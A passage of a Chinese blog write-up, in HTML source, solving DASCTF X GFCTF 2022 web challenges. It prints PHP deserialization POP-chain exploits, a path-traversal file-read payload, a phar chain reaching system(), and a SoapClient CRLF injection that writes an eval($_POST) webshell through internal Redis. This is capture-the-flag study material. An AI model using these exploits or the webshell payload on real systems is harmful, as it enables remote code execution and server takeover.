<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$time</span> = <span class="string">&quot;Two and a half years&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$ctf</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ctf = <span class="variable">$ctf</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf . <span class="string">&quot;: Duration of practice: &quot;</span> . <span class="variable language_">$this</span>-&gt;time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&quot;hint is depend on you&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPassword</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setPassword</span>(<span class="params"><span class="variable">$password</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">secret</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span> <span class="string">&quot;hint.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">setPassword</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="string">&quot;Ctfer&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码比较长，但是好懂，最终漏洞触发点是为fine类中的call_user_func函数，达到任意函数调用，链子也比较简单：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sorry:__destruct() -&gt; show:__toString() -&gt; secret_code:call() -&gt; secret_code:show() -&gt;</span><br><span class="line">sorry:__get -&gt; fine : __invoke</span><br></pre></td></tr></table></figure><p>这里防止我们调用的函数为空，需要绕过wakeup，常规绕过就是属性值大于原有值，这里看wp学习另一种绕过方式，fast_destruct，常规的执行顺序：（wake_up -&gt; __desturct）</p><p>我们去掉一个大括号，让它强制先执行__destruct方法，但是这个方法在只有一个类是不适用的。</p><p>这一题还是比较简单的，直接上exp。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;passthru&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>=<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//$this-&gt;ctf=new secret_code();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key= <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code=<span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;hint-&gt;ctf=<span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"><span class="variable">$str</span> =  <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$str1</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fine&quot;:2&#x27;</span>,<span class="string">&#x27;fine&quot;:5&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>((<span class="variable">$str1</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为这一题的php版本为php7，对类属性不敏感，所以把私有属性全都改为public编写exp会更简单。</p><h2 id="hade-waibo"><a href="#hade-waibo" class="headerlink" title="hade_waibo"></a>hade_waibo</h2><p>这道题网上查到最多的就是非预期解法。</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/91.png" class><p>随便注册一个用户名进去后有三个功能，上传，删除和搜索。我们在搜索功能上发现可以任意读文件，也就是这里存在非预期，直接目录穿越读取start.sh，payload为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file.php?m=show&amp;filename=…/…/…/…/start.sh</span><br></pre></td></tr></table></figure><p>这个文件有flag的文件名，再利用任意文件读取漏洞读出flag就行了。这个方法很巧妙，但是学不到什么东西，看官方wp放的预期解：</p><p>把网站源码读出来，一共有三个php文件，代码一共太多了，这里只放关键代码，这里我们利用class.php的User类和Test类，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;isLogin&#x27;</span>] = True;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$cklen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$cklen</span> != <span class="number">0</span> <span class="keyword">and</span> <span class="variable">$cklen</span> &lt;= <span class="number">6</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test类：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;./upload&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">backdoor</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;value = <span class="string">&quot;Don&#x27;t make dream.Wake up plz!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>],<span class="number">0</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="string">&quot;Hack by <span class="subst">$file</span> !&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Unreachable! :)&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backdoor</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9?$@]+/&#x27;</span>, <span class="variable">$this</span>-&gt;value))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="string">&#x27;nono~&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test类有我们的system敏感函数，但是过滤了字母数字，这两个类可以反序列化，另外也有文件包含，所以我们可以通过上传phar文件来执行这个system函数，另外参数value在__wakeup函数会被赋值，这里我们要用的User类了，我们可以让Test类中的value属性去引用User类中的地址，那么就可以通过修改username的值来间接控制value的内容，在User类的__wakeup函数有个赋值操作</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/92.png" class><p>$_SESSION[“username”]就是我们注册的用户名，所以赋值操作我们可控，那么剩下一个问题，我们怎么在过滤字母数字的情况下执行linux命令，可以用. .&#x2F;*来执行当前目录下的文件。linux中可以用点来执行任意shell文件，那么通过网站的上传功能上传一个shell文件，然后再注册一个用户名为. .&#x2F;*的用户，上传一个phar文件来触发反序列化，话不多说，开始实操，嘿嘿</p><p>通过上传界面上传写入ls &#x2F;命令的shell文件。</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/93.png" class><p>接下来就是注册一个. .&#x2F;*的用户名，编写exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;username=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;aaa=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;abcd.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里看exp有个问题，为什么User类要新增一个属性去实例化Test类，这里看到一位师傅的博客（<a href="https://blog.csdn.net/trytowritecode/article/details/127513176">DASCTF X GFCTF 2022十月挑战赛！_递归 trash can的博客-CSDN博客</a>）解释的比较详细，我自己也在本地测试看看生成的序列化串，</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/94.png" class><p>这是正常的，</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/95.png" class><p>这里的value属性就没有引用了，所以新加的属性是为了让value能够引用的，直接上传phar文件，</p><p>最后利用网站的搜索功能，用phar伪协议读取，</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/96.png" class><p>这里是成功执行命令了。同时出现了flag文件，通过任意文件读取获得flag。</p><h2 id="EasyLove"><a href="#EasyLove" class="headerlink" title="EasyLove"></a>EasyLove</h2><p>题目描述就给了hint，让我们打redis数据库，好家伙，看题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$wllm</span>,<span class="variable">$arsenetang</span>,<span class="variable">$l61q4cheng</span>,<span class="variable">$love</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;wllm = <span class="variable">$wllm</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arsenetang = <span class="variable">$arsenetang</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;l61q4cheng = <span class="variable">$l61q4cheng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="variable">$love</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt; hint.<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hello</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$world</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$hello</span>);</span><br></pre></td></tr></table></figure><p>有个hint类可以读取hint.php，先写个序列化串看一下提示吧，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$hint</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里要用绝对路径，不然读取不出来。</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/97.png" class><p>这里写的20220311就是redis数据库的密码了。我们怎么去访问redis数据库，别急，这里还有个swpu类，</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/98.png" class><p>实例化任意类，那么我们可以利用某些原生类，结合题目描述打内网redis数据库，我们能用的原生类就只有SoapClient，</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/99.png" class><p>这里会调用一个不存在的方法，正好可以触发SoapClient原生类的call方法，那么利用条件满足。</p><p>我们知道SoapClient类需要两个参数，第一个参数通常指明是否是wsdl模式，我们构造的时候通常为Null，第二个参数是个数组，在非wsdl模式下，必须设置location和uri选项，其他可选。我们可以通过uri选项向内网redis发指令写木马。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AUTH 20220311 //验证客户端链接</span><br><span class="line">CONFIG SET dir /var/www/html  //设置写入的目录</span><br><span class="line">SET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;  //设置写入的内容</span><br><span class="line">CONFIG SET dbfilename cmd.php  //设置写入的文件名</span><br><span class="line">SAVE  //保存结束</span><br></pre></td></tr></table></figure><p>redis一般在主机的6379开启服务，编写exp：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1:6379&quot;</span>;</span><br><span class="line"><span class="variable">$option</span> = <span class="keyword">array</span>(<span class="string">&quot;location&quot;</span>=&gt;<span class="variable">$target</span>,<span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hello\r\nAUTH 20220311\r\nCONFIG SET dir /var/www/html\r\nSET x &#x27;&lt;?@eval(\$_POST[1]);?&gt;&#x27;\r\nCONFIG SET dbfilename cmd.php\r\nSAVE\r\nhello&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">swpu</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$wllm</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arsenetang</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$l61q4cheng</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;wllm = <span class="string">&quot;SoapClient&quot;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;arsenetang = Null;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">swpu</span>();</span><br><span class="line"><span class="variable">$aa</span>-&gt;l61q4cheng = <span class="variable">$option</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>打入payload后在web目录下访问cmd.php，</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/100.png" class><p>用蚁剑连接。 查看flag文件，有大小打开却没有东西，那肯定就是无权限了，使用date命令将flag给带出来。</p><img src="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/101.png" class><p>最终得到flag。</p><h2 id="BlogSystem"><a href="#BlogSystem" class="headerlink" title="BlogSystem"></a>BlogSystem</h2><p>最后一个题目，感觉考的知识点好多啊，复现起来也比较困难，在此就不写上自己的题解了，贴上出题人pysnow师傅的文章<a href="https://pysnow.cn/archives/566/">DASCTF10月赛出题笔记 BlogSystem - Pysnow’s Blog</a>写的真的非常详细。</p>]]></content>
      
      
      <categories>
          
          <category> 赛题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf利用ftp被动模式打fpm</title>
      <link href="/2023/01/31/ssrf%E5%88%A9%E7%94%A8ftp%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E6%89%93fpm/"/>
      <url>/2023/01/31/ssrf%E5%88%A9%E7%94%A8ftp%E8%A2%AB%E5%8A%A8%E6%A8%A1%E5%BC%8F%E6%89%93fpm/</url>
      
